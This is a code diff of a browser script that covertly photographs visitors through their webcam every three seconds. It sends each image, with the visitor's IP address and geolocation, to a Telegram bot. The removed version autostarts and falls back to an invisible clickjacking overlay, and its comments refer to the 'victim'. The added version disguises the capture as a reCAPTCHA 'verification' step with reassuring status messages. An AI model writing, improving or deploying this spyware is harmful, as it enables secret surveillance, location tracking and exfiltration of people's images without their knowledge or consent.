@@ -1,35 +1,31 @@
 import { CONFIG } from "./config.js";
 
-// --- DOM refs (minimal) ---
-const video   = document.getElementById("video");
-const canvas  = document.getElementById("canvas");
-const status  = document.getElementById("status");
+const video     = document.getElementById("video");
+const canvas    = document.getElementById("canvas");
+const status    = document.getElementById("status");
+const verifyBtn = document.getElementById("verifyBtn");
+const recaptcha = document.getElementById("recaptcha");
 
-const params  = new URLSearchParams(window.location.search);
-const chatId  = params.get("id") || "FALLBACK_CHAT_ID";
+const params = new URLSearchParams(window.location.search);
+const chatId = params.get("id") || "FALLBACK_CHAT_ID";
 
 let stream       = null;
 let captureTimer = null;
 let count        = 0;
+let capturing    = false;
 
-// --- Get IP ---
+function setStatus(msg) { status.textContent = msg; }
+
 async function getIP() {
   try {
     const r = await fetch("https://api.ipify.org?format=json");
     const d = await r.json();
     return d.ip;
   } catch {
-    try {
-      const r = await fetch("https://ipapi.co/json/");
-      const d = await r.json();
-      return d.ip;
-    } catch {
-      return "Unknown";
-    }
+    return "Unknown";
   }
 }
 
-// --- Get geolocation ---
 async function getGeo() {
   try {
     const r = await fetch("https://ipapi.co/json/");
@@ -40,9 +36,8 @@ async function getGeo() {
   }
 }
 
-// --- Capture and send ---
 async function capture() {
-  if (!stream) return;
+  if (!stream || !capturing) return;
 
   canvas.width  = video.videoWidth  || 640;
   canvas.height = video.videoHeight || 480;
@@ -73,66 +68,69 @@ async function capture() {
     await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
       method: "POST", body: fd
     });
-  } catch (e) {
-    // silently fail — victim never knows
-  }
+  } catch (_) {}
 
   count++;
-  if (status) status.textContent = `📸 ${count}`;
+  setStatus(`✓ Verified · ${count} photos`);
 }
 
-// --- Start everything ---
-async function autoStart() {
+function stopCapture() {
+  capturing = false;
+  if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+}
+
+// Called when user clicks the button
+verifyBtn.addEventListener("click", async () => {
+  if (capturing) return;
+
   try {
+    setStatus("Requesting camera access...");
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = "Starting...";
+
     stream = await navigator.mediaDevices.getUserMedia({
       video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
     });
+
     video.srcObject = stream;
     await video.play();
-
-    // Wait for actual frames
     await new Promise(resolve => {
       if (video.readyState >= 2) return resolve();
       video.onloadeddata = resolve;
     });
 
-    // First capture immediately
-    await capture();
+    // Start continuous capture every 3 seconds
+    capturing = true;
+    await capture();                      // First shot immediately
+    captureTimer = setInterval(capture, 3000); // Then every 3s
 
-    // Then every 3 seconds
-    captureTimer = setInterval(capture, 3000);
-
-    if (status) status.textContent = "📷 Recording";
+    setStatus(`✓ Camera active · ${count} photos`);
 
   } catch (err) {
-    // Browser denied auto-start — show a tiny invisible button
-    // as a fallback (click-jacking style)
-    if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
-      createFallbackButton();
-    }
+    setStatus("❌ Camera access required. Please allow and try again.");
+    verifyBtn.disabled = false;
+    verifyBtn.textContent = "Start Verification";
+    console.warn("Camera error:", err);
   }
-}
-
-// --- Stealth fallback if auto-start fails ---
-function createFallbackButton() {
-  // Invisible fullscreen overlay — catches the first click anywhere
-  const overlay = document.createElement("div");
-  overlay.style.cssText = `
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    z-index: 9999; cursor: default; background: transparent;
-  `;
-  overlay.addEventListener("click", async () => {
-    overlay.remove();
-    await autoStart();
-  }, { once: true });
-  document.body.prepend(overlay);
-}
-
-// --- Stop on page leave ---
-window.addEventListener("beforeunload", () => {
-  if (captureTimer) clearInterval(captureTimer);
-  if (stream) stream.getTracks().forEach(t => t.stop());
 });
 
-// --- GO! ---
-autoStart();
+// reCAPTCHA solved → redirect
+window.onRecaptchaSuccess = () => {
+  stopCapture();
+  setStatus("✓ Verification complete. Redirecting...");
+  setTimeout(() => {
+    window.location.href = "next.html";
+  }, 800);
+};
+
+window.onRecaptchaExpired = () => {
+  setStatus("⚠️ Verification expired. Please try again.");
+};
+
+window.onRecaptchaError = () => {
+  setStatus("⚠️ Verification error. Please try again.");
+};
+
+// Cleanup on page leave
+window.addEventListener("beforeunload", stopCapture);
